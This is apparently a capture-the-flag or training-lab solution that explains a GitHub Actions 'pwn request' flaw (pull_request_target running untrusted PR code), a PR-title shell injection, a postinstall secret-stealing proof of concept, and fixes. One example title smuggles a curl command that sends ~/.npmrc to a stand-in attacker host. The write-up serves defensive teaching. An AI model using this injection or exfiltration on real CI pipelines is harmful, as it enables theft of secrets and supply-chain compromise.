# Challenge-03 - Solution

The bug is in `.github/workflows/pr-validate.yml`. It lets any pull request run its
own code on CI and steal the repo's secrets. This is the same trick behind the 2025-26
npm supply-chain attacks (s1ngularity / Nx, Shai-Hulud).

## The problem

There are two GitHub Actions triggers:

- `pull_request` - runs **without** secrets. Safe for untrusted PRs.
- `pull_request_target` - runs **with** secrets and write access. Only safe if the job
  runs *your* code, never the contributor's.

This workflow uses `pull_request_target` (so secrets are present) and then does the one
thing you must never do with it: it runs the contributor's code.

```yaml
on:
  pull_request_target:                                 # secrets are available

- uses: actions/checkout@v4
  with:
    ref: ${{ github.event.pull_request.head.sha }}     # pull in the attacker's files

- run: npm install                                     # runs their package.json scripts
- run: npm run validate                                # runs their validate-spec.js
  env:
    NPM_TOKEN: ${{ secrets.NPM_TOKEN }}                # ...with the secrets right here
```

So a stranger's first-ever PR gets code execution on the runner with `NPM_TOKEN`,
`REGISTRY_TOKEN`, and a write-access `GITHUB_TOKEN` in the environment. They can read
the secrets, push to the repo, or publish poisoned releases.

## Bonus bug

The PR **title** is attacker-controlled and gets pasted straight into a shell command:

```yaml
- run: echo "Validating pull request: ${{ github.event.pull_request.title }}"
```

A title like `"; curl -d @$HOME/.npmrc https://evil.example #` runs commands of the
attacker's choosing - no checkout needed. The `github-script` step at the bottom has the
same flaw.

## Proof of concept

The attacker opens a PR that adds a `postinstall` hook to `app/package.json`:

```json
"scripts": {
  "validate": "node scripts/validate-spec.js",
  "postinstall": "node scripts/postinstall.js"
}
```

`postinstall.js` reads the secrets from the environment and sends them off. When CI runs
`npm install`, the secrets leak. To watch it locally:

```bash
cd challenge-03
docker build -t specstream-c03 -f simulate/Dockerfile .
docker run --rm specstream-c03
```

You'll see the (fake) tokens captured by the stand-in attacker listener. 

## The fix

1. Use `pull_request` (no secrets) to build and test untrusted PRs.
2. If you really need `pull_request_target`, never check out or run the PR's code in it -
   only run your own trusted code (e.g. to add a label).
3. Pass context values through `env:` instead of inlining them, and quote them:

   ```yaml
   - env:
       PR_TITLE: ${{ github.event.pull_request.title }}
     run: echo "Validating pull request: $PR_TITLE"
   ```

4. Set least-privilege `permissions:` and require approval before CI runs on PRs from
   new contributors.

## References

- GitHub Security Lab - Preventing pwn requests:
  https://securitylab.github.com/research/github-actions-preventing-pwn-requests/
- s1ngularity / Nx (CVE-2025-10894) and Shai-Hulud npm worm.
